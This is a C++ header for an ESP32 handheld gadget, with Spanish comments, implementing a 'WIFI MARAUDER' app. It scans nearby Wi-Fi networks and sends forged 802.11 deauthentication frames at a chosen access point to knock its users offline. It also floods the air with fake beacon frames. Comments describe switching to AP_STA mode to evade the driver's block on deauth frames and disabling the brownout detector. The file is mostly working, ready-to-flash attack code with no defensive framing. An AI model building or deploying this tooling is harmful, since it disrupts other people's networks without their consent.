#ifndef APPWIFI_H
#define APPWIFI_H
#include "App.h"
#include "Emojis.h"
#include "ui/Launcher.h"
#include "config.h" 
#include <WiFi.h>
#include "esp_wifi.h"
#include "soc/rtc_cntl_reg.h" // Necesario para apagar el BROWNOUT_RESET

#define LED_PIN 48

class AppWiFi : public App {
private:
    enum EstadoWiFi { MENU_PRINCIPAL, SCAN_WIFI, LISTA_WIFI, ATACANDO_DEAUTH, ATACANDO_BEACON };
    EstadoWiFi estado = MENU_PRINCIPAL;

    int indiceMenu = 0;
    String opcionesMenu[3] = {"1. SCAN & DEAUTH", "2. SPAM (RANDOM)", "3. SPAM (RICKROLL)"};

    int n_redes = 0;
    int indiceSeleccionado = 0;
    uint8_t macObjetivo[6];
    int canalObjetivo = 1;
    String nombreObjetivo = "";

    unsigned long ultimoParpadeo = 0;
    unsigned long ultimoMovimiento = 0;
    unsigned long ultimoAtaque = 0;
    int anguloNeon = 0;
    unsigned long ultimoFrameNeon = 0;
    unsigned long inicioEscaneo = 0;
    int segundosRestantes = 4;
    bool estadoLed = false;
    bool pantallaActualizada = false;
    bool btnAnterior = false;

    int tipoBeacon = 0; 
    int rickrollIndex = 0;
    long paquetesEnviados = 0;
    const char* rickrollList[8] = {
        "01 Never gonna give you up",
        "02 Never gonna let you down",
        "03 Never gonna run around",
        "04 and desert you",
        "05 Never gonna make you cry",
        "06 Never gonna say goodbye",
        "07 Never gonna tell a lie",
        "08 and hurt you"
    };

    uint8_t deauth_packet[26] = {
        0xC0, 0x00, 0x00, 0x00,
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
        0x00, 0x00, 0x07, 0x00 
    };

    uint8_t beacon_template[38] = {
        0x80, 0x00, 0x00, 0x00,
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
        0x00, 0x00,                         
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
        0x64, 0x00,                         
        0x01, 0x04,                         
        0x00, 0x00                          
    };

    String generarSSIDRandom() {
        String chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        String ssid = "";
        int len = random(6, 12);
        for(int i=0; i<len; i++) ssid += chars[random(chars.length())];
        return ssid;
    }

    void lanzarBeacon(String ssid, uint8_t canal) {
        uint8_t packet[128];
        memcpy(packet, beacon_template, 38);
        
        for(int i=0; i<6; i++) {
            uint8_t r = random(256);
            packet[10+i] = r;
            packet[16+i] = r;
        }
        packet[10] = 0x02; 
        packet[16] = 0x02;
        
        int len = ssid.length();
        if(len > 32) len = 32; 
        packet[37] = len;
        for(int i=0; i<len; i++) packet[38+i] = ssid[i];
        
        uint8_t tail[] = {
            0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, 
            0x03, 0x01, canal 
        };
        memcpy(packet + 38 + len, tail, sizeof(tail));
        
        esp_wifi_set_channel(canal, WIFI_SECOND_CHAN_NONE);
        
        // SECRETO MARAUDER: Inyectar como Punto de Acceso (WIFI_IF_AP)
        esp_wifi_80211_tx(WIFI_IF_AP, packet, 38 + len + sizeof(tail), false);
        paquetesEnviados++;
    }

    // --- ACTIVACIÓN SEGURA ANTI-BROWNOUT ---
    void activarModoAtaque(int canal) {
        // 1. Apagar el detector de caídas de voltaje por hardware
        WRITE_PERI_REG(RTC_CNTL_BROWN_OUT_REG, 0); 
        
        WiFi.disconnect(true);
        // 2. Modo AP_STA para evadir el bloqueo de Type 0xC0
        WiFi.mode(WIFI_AP_STA); 
        
        esp_wifi_set_promiscuous(true);
        esp_wifi_set_channel(canal, WIFI_SECOND_CHAN_NONE);
        
        // 3. Reducir potencia a 15dBm para salvar la batería durante ráfagas
        esp_wifi_set_max_tx_power(60); 
    }

    void desactivarModoAtaque() {
        esp_wifi_set_promiscuous(false);
        WiFi.mode(WIFI_STA);
        WiFi.disconnect();
        
        // Restaurar voltaje y potencia
        esp_wifi_set_max_tx_power(78); 
        WRITE_PERI_REG(RTC_CNTL_BROWN_OUT_REG, 1); 
    }

public:
    const char* obtenerNombre() override { return "WIFI MARAUDER"; }
    const uint8_t* obtenerEmoji() override { return emoji_wifi; }
    
    void setup() override {
        WiFi.mode(WIFI_STA);
        WiFi.disconnect();
    }

    void alEntrar() override {
        estado = MENU_PRINCIPAL;
        indiceMenu = 0;
        pantallaActualizada = false;
        ultimoMovimiento = millis();
        btnAnterior = (digitalRead(JOY_SW) == LOW);
        ultimoFrameNeon = millis();
        anguloNeon = 0;
        
        desactivarModoAtaque();
    }
    
    void alSalir() override {
        WiFi.scanDelete(); 
        desactivarModoAtaque();
        neopixelWrite(LED_PIN, 0, 0, 0); 
    }

    void loop(Arduino_Canvas* canvas) override {
        
        int valVert = joyEjeY_esVertical ? analogRead(JOY_Y) : analogRead(JOY_X);
        int valHoriz = joyEjeY_esVertical ? analogRead(JOY_X) : analogRead(JOY_Y);

        bool arriba = joyInvVertical ? (valVert > 3200) : (valVert < 800);
        bool abajo = joyInvVertical ? (valVert < 800) : (valVert > 3200);
        bool izq = joyInvHorizontal ? (valHoriz > 3200) : (valHoriz < 800);
        bool der = joyInvHorizontal ? (valHoriz < 800) : (valHoriz > 3200);

        bool botonAhora = (digitalRead(JOY_SW) == LOW);
        bool clicSimple = (botonAhora && !btnAnterior);

        if (millis() - ultimoFrameNeon > 30) {
            anguloNeon = (anguloNeon + 8) % 360; 
            ultimoFrameNeon = millis();
            pantallaActualizada = false; 
        }

        // ==========================================
        // ESTADO 0: MENÚ PRINCIPAL
        // ==========================================
        if (estado == MENU_PRINCIPAL) {
            if (millis() - ultimoMovimiento > 200) {
                if (arriba) { indiceMenu--; pantallaActualizada = false; ultimoMovimiento = millis(); }
                if (abajo)  { indiceMenu++; pantallaActualizada = false; ultimoMovimiento = millis(); }
                if (indiceMenu < 0) indiceMenu = 2;
                if (indiceMenu > 2) indiceMenu = 0;
            }

            if (clicSimple) {
                if (indiceMenu == 0) { 
                    estado = SCAN_WIFI; 
                    inicioEscaneo = millis();
                    segundosRestantes = 4;
                    WiFi.scanNetworks(true);
                } else {
                    estado = ATACANDO_BEACON;
                    tipoBeacon = (indiceMenu == 1) ? 1 : 2;
                    paquetesEnviados = 0;
                    
                    activarModoAtaque(1); 
                }
                pantallaActualizada = false;
            }

            if (!pantallaActualizada) {
                canvas->fillScreen(BLACK);
                canvas->drawCircle(120, 120, 118, IRON_CYAN);
                canvas->drawArc(120, 120, 118, 112, anguloNeon, (anguloNeon + 60) % 360, IRON_BLUE); 
                
                Launcher::dibujarTextoCentrado(canvas, "WIFI MARAUDER", 40, 1, IRON_CYAN);
                canvas->drawLine(20, 50, 220, 50, IRON_DARK);

                for (int i = 0; i < 3; i++) {
                    int yPos = 80 + (i * 35);
                    
                    if (i == indiceMenu) {
                        canvas->fillRoundRect(15, yPos - 12, 210, 24, 3, IRON_RED);
                        canvas->fillTriangle(20, yPos-4, 20, yPos+4, 25, yPos, WHITE);
                        Launcher::dibujarTextoCentrado(canvas, opcionesMenu[i].c_str(), yPos - 3, 1, WHITE);
                    } else {
                        Launcher::dibujarTextoCentrado(canvas, opcionesMenu[i].c_str(), yPos - 3, 1, IRON_BLUE);
                    }
                }
                
                canvas->drawBitmap(120 - 45, 200, emoji_back, 32, 32, IRON_CYAN);
                canvas->setTextSize(1);
                canvas->setCursor(120 - 25, 212);
                canvas->setTextColor(IRON_RED);
                canvas->print("DOBLE CLICK");
                
                canvas->flush();
                pantallaActualizada = true;
            }
        }
        // ==========================================
        // ESTADO 1: ESCANEANDO EL AIRE
        // ==========================================
        else if (estado == SCAN_WIFI) {
            if (millis() - ultimoParpadeo > 200) {
                ultimoParpadeo = millis();
                estadoLed = !estadoLed;
                if (estadoLed) neopixelWrite(LED_PIN, 255, 0, 0); 
                else neopixelWrite(LED_PIN, 0, 0, 0);
            }

            int transcurrido = (millis() - inicioEscaneo) / 1000;
            int nuevoRestante = 4 - transcurrido;
            if (nuevoRestante < 0) nuevoRestante = 0;
            if (nuevoRestante != segundosRestantes) segundosRestantes = nuevoRestante;

            if (!pantallaActualizada) {
                canvas->fillScreen(BLACK);
                canvas->drawCircle(120, 120, 118, IRON_RED);
                canvas->drawArc(120, 120, 118, 112, anguloNeon, (anguloNeon + 60) % 360, IRON_DARK); 
                canvas->drawArc(120, 120, 117, 113, (anguloNeon + 20) % 360, (anguloNeon + 50) % 360, IRON_RED); 

                Launcher::dibujarTextoCentrado(canvas, "WIFI SCAN", 100, 2, IRON_RED);
                
                char tiempoStr[32];
                sprintf(tiempoStr, "Termina en: %d s", segundosRestantes);
                Launcher::dibujarTextoCentrado(canvas, tiempoStr, 130, 1, WHITE);
                
                canvas->drawBitmap(120 - 45, 200, emoji_back, 32, 32, IRON_CYAN);
                canvas->setTextSize(1);
                canvas->setCursor(120 - 25, 212);
                canvas->setTextColor(IRON_RED);
                canvas->print("DOBLE CLICK");
                
                canvas->flush();
                pantallaActualizada = true;
            }

            if (segundosRestantes == 0) {
                int16_t scanRes = WiFi.scanComplete();
                if (scanRes >= 0) {
                    n_redes = scanRes;
                    estado = LISTA_WIFI;
                    neopixelWrite(LED_PIN, 0, 0, 0); 
                    pantallaActualizada = false;
                } else if (scanRes == WIFI_SCAN_FAILED) {
                    WiFi.scanNetworks(true);
                    inicioEscaneo = millis();
                }
            }
        }
        // ==========================================
        // ESTADO 2: LISTA DE OBJETIVOS
        // ==========================================
        else if (estado == LISTA_WIFI) {
            if (millis() - ultimoMovimiento > 250) {
                if (arriba) { indiceSeleccionado--; pantallaActualizada = false; ultimoMovimiento = millis(); }
                if (abajo) { indiceSeleccionado++; pantallaActualizada = false; ultimoMovimiento = millis(); }
                if (izq) { estado = MENU_PRINCIPAL; pantallaActualizada = false; ultimoMovimiento = millis(); }

                if (indiceSeleccionado < 0) indiceSeleccionado = (n_redes > 0) ? n_redes - 1 : 0;
                if (indiceSeleccionado >= n_redes) indiceSeleccionado = 0;

                if ((clicSimple || der) && n_redes > 0) {
                    nombreObjetivo = WiFi.SSID(indiceSeleccionado);
                    canalObjetivo = WiFi.channel(indiceSeleccionado);
                    uint8_t* bssid = WiFi.BSSID(indiceSeleccionado);
                    
                    for(int i = 0; i < 6; i++) {
                        macObjetivo[i] = bssid[i];
                        deauth_packet[10 + i] = macObjetivo[i]; 
                        deauth_packet[16 + i] = macObjetivo[i]; 
                    }
                    
                    activarModoAtaque(canalObjetivo);

                    estado = ATACANDO_DEAUTH;
                    pantallaActualizada = false;
                    ultimoMovimiento = millis();
                    ultimoAtaque = millis();
                }
            }

            if (!pantallaActualizada) {
                canvas->fillScreen(BLACK);
                canvas->drawCircle(120, 120, 118, IRON_CYAN);
                
                char titulo[32];
                sprintf(titulo, "REDES WIFI (%d)", n_redes);
                Launcher::dibujarTextoCentrado(canvas, titulo, 30, 1, IRON_CYAN);
                canvas->drawLine(20, 40, 220, 40, IRON_DARK);

                if (n_redes == 0) {
                    Launcher::dibujarTextoCentrado(canvas, "NO HAY REDES", 110, 2, IRON_BLUE);
                } else {
                    int inicio = indiceSeleccionado - 1;
                    if (inicio < 0) inicio = 0;
                    if (n_redes > 3 && inicio > n_redes - 3) inicio = n_redes - 3;

                    for (int i = 0; i < 3 && (inicio + i) < n_redes; i++) {
                        int idx = inicio + i;
                        int yPos = 65 + (i * 35);

                        canvas->setTextSize(1);
                        canvas->setCursor(25, yPos);
                        
                        String ssidStr = WiFi.SSID(idx);
                        if(ssidStr.length() > 11) ssidStr = ssidStr.substring(0, 11);
                        
                        if (idx == indiceSeleccionado) {
                            canvas->fillRoundRect(10, yPos - 10, 220, 25, 3, IRON_RED);
                            canvas->fillTriangle(15, yPos-2, 15, yPos+6, 20, yPos+2, WHITE);
                            canvas->setTextColor(WHITE);
                        } else {
                            canvas->setTextColor(IRON_BLUE);
                        }

                        canvas->print(String(idx + 1) + ". " + ssidStr + " [" + String(WiFi.RSSI(idx)) + "]");
                    }
                    Launcher::dibujarTextoCentrado(canvas, "Clic/Der = ATACAR", 170, 1, IRON_RED);
                    Launcher::dibujarTextoCentrado(canvas, "< Volver = Izq", 185, 1, IRON_DARK);
                }
                
                canvas->drawBitmap(120 - 45, 200, emoji_back, 32, 32, IRON_CYAN);
                canvas->setTextSize(1);
                canvas->setCursor(120 - 25, 212);
                canvas->setTextColor(IRON_RED);
                canvas->print("DOBLE CLICK");
                
                canvas->flush();
                pantallaActualizada = true;
            }
        }
        // ==========================================
        // ESTADO 3: ATACANDO (DEAUTH INJECTION)
        // ==========================================
        else if (estado == ATACANDO_DEAUTH) {
            if (millis() - ultimoParpadeo > 80) {
                ultimoParpadeo = millis();
                estadoLed = !estadoLed;
                if (estadoLed) neopixelWrite(LED_PIN, 255, 0, 0);
                else neopixelWrite(LED_PIN, 0, 0, 0);
            }

            if (millis() - ultimoAtaque > 50) {
                ultimoAtaque = millis();
                // SECRETO MARAUDER: Inyectar como Punto de Acceso (WIFI_IF_AP)
                esp_wifi_80211_tx(WIFI_IF_AP, deauth_packet, sizeof(deauth_packet), false);
            }

            if (millis() - ultimoMovimiento > 250) {
                if (izq || clicSimple) {
                    desactivarModoAtaque();
                    estado = MENU_PRINCIPAL;
                    neopixelWrite(LED_PIN, 0, 0, 0); 
                    pantallaActualizada = false;
                    ultimoMovimiento = millis();
                }
            }

            if (!pantallaActualizada) {
                canvas->fillScreen(BLACK);
                canvas->drawCircle(120, 120, 118, IRON_RED);
                canvas->drawArc(120, 120, 118, 112, anguloNeon, (anguloNeon + 60) % 360, IRON_DARK); 

                Launcher::dibujarTextoCentrado(canvas, "DEAUTH ATTACK", 35, 1, IRON_RED);
                canvas->drawLine(30, 45, 210, 45, IRON_DARK);

                Launcher::dibujarTextoCentrado(canvas, nombreObjetivo.substring(0, 18).c_str(), 75, 2, WHITE);
                
                char macStr[32];
                sprintf(macStr, "%02X:%02X:%02X:%02X:%02X:%02X", 
                        macObjetivo[0], macObjetivo[1], macObjetivo[2], 
                        macObjetivo[3], macObjetivo[4], macObjetivo[5]);
                Launcher::dibujarTextoCentrado(canvas, macStr, 105, 1, IRON_BLUE);

                char chStr[32];
                sprintf(chStr, "Canal: %d", canalObjetivo);
                Launcher::dibujarTextoCentrado(canvas, chStr, 125, 1, IRON_CYAN);

                Launcher::dibujarTextoCentrado(canvas, "EXPULSANDO USUARIOS...", 150, 1, IRON_RED);
                Launcher::dibujarTextoCentrado(canvas, "< Volver = Clic/Izq", 175, 1, IRON_DARK);

                canvas->drawBitmap(120 - 45, 200, emoji_back, 32, 32, IRON_CYAN);
                canvas->setTextSize(1);
                canvas->setCursor(120 - 25, 212);
                canvas->setTextColor(IRON_RED);
                canvas->print("DOBLE CLICK");

                canvas->flush();
                pantallaActualizada = true;
            }
        }
        // ==========================================
        // ESTADO 4: BEACON SPAM
        // ==========================================
        else if (estado == ATACANDO_BEACON) {
            
            if (millis() - ultimoParpadeo > 50) { 
                ultimoParpadeo = millis();
                estadoLed = !estadoLed;
                if (estadoLed) neopixelWrite(LED_PIN, 255, 0, 255); 
                else neopixelWrite(LED_PIN, 0, 0, 0);
            }

            if (millis() - ultimoAtaque > 20) { // Un poco más de delay (20ms) para salvar batería
                ultimoAtaque = millis();
                if (tipoBeacon == 1) { 
                    lanzarBeacon(generarSSIDRandom(), random(1, 12));
                } else { 
                    lanzarBeacon(String(rickrollList[rickrollIndex]), 6);
                    rickrollIndex = (rickrollIndex + 1) % 8;
                }
            }

            if (millis() - ultimoMovimiento > 250) {
                if (izq || clicSimple) {
                    desactivarModoAtaque();
                    estado = MENU_PRINCIPAL;
                    neopixelWrite(LED_PIN, 0, 0, 0); 
                    pantallaActualizada = false;
                    ultimoMovimiento = millis();
                }
            }

            if (!pantallaActualizada) {
                canvas->fillScreen(BLACK);
                canvas->drawCircle(120, 120, 118, IRON_GREEN);
                canvas->drawArc(120, 120, 118, 112, anguloNeon, (anguloNeon + 60) % 360, WHITE); 

                Launcher::dibujarTextoCentrado(canvas, "BEACON SPAM", 40, 2, IRON_CYAN);
                canvas->drawLine(20, 60, 220, 60, IRON_DARK);

                Launcher::dibujarTextoCentrado(canvas, tipoBeacon == 1 ? "Modo: ALEATORIO" : "Modo: RICKROLL", 85, 1, IRON_CYAN);
                Launcher::dibujarTextoCentrado(canvas, "Inundando el aire...", 110, 1, WHITE);
                
                char chStr[32];
                sprintf(chStr, "Inyectados: %ld", paquetesEnviados);
                Launcher::dibujarTextoCentrado(canvas, chStr, 140, 1, IRON_GREEN);

                Launcher::dibujarTextoCentrado(canvas, "< Detener = Clic/Izq", 175, 1, IRON_DARK);

                canvas->drawBitmap(120 - 45, 200, emoji_back, 32, 32, IRON_CYAN);
                canvas->setCursor(120 - 25, 212);
                canvas->setTextColor(IRON_RED);
                canvas->print("DOBLE CLICK");

                canvas->flush();
                pantallaActualizada = true;
            }
        }

        btnAnterior = botonAhora;
        delay(10);
    }
};
#endif